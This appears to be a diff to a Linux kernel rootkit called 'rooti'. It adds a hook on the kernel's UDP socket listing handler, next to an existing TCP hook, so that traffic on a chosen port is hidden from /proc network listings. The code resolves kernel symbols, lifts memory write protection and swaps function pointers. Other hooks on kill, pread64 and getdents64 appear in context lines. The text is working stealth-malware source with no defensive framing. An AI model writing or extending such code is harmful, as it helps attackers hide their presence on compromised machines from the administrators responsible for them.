@@ -54,6 +54,7 @@ static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
 static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
 
 static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
 
 static asmlinkage long hook_kill(const struct pt_regs *regs)
 {
@@ -211,10 +212,22 @@ static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
     if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
         return 0;
     }
-    // Not the port to hide - calL the original handler
+    // Not the port to hide - call the original handler
     return orig_tcp4_seq_show(seq, v);
 }
 
+static int hook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *socket = v;
+
+    // Check that this is not the header line and that the record is the one we want to hide
+    if (socket != SEQ_START_TOKEN && socket->sk_num == ROOTI_HIDE_PORT) {
+        return 0;
+    }
+
+    // Not the port to hide - call the original handler
+    return orig_udp4_seq_show(seq, v);
+}
 
 // List of system calls to hook :D
 struct rooti_syscall_hook hooks[] = {
@@ -245,11 +258,17 @@ static int __init rooti_init(void)
         return ret;
     }
 
+    struct seq_operations *seq_ops;
+
     rooti_unprotect_memory();
 
-    struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    orig_tcp4_seq_show = __tcp4_seq_ops->show;
-    __tcp4_seq_ops->show = hook_tcp4_seq_show;
+    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    orig_tcp4_seq_show = seq_ops->show;
+    seq_ops->show = hook_tcp4_seq_show;
+
+    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
+    orig_udp4_seq_show = seq_ops->show;
+    seq_ops->show = hook_udp4_seq_show;
 
     rooti_protect_memory();
 
@@ -274,10 +293,15 @@ static void __exit rooti_exit(void)
         }
     }
 
+    struct seq_operations *seq_ops;
+
     rooti_unprotect_memory();
 
-    struct seq_operations *__tcp4_seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
-    __tcp4_seq_ops->show = orig_tcp4_seq_show;
+    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("tcp4_seq_ops");
+    seq_ops->show = orig_tcp4_seq_show;
+
+    seq_ops = (struct seq_operations *)__kallsyms_lookup_name("udp_seq_ops");
+    seq_ops->show = orig_udp4_seq_show;
 
     rooti_protect_memory();
 }
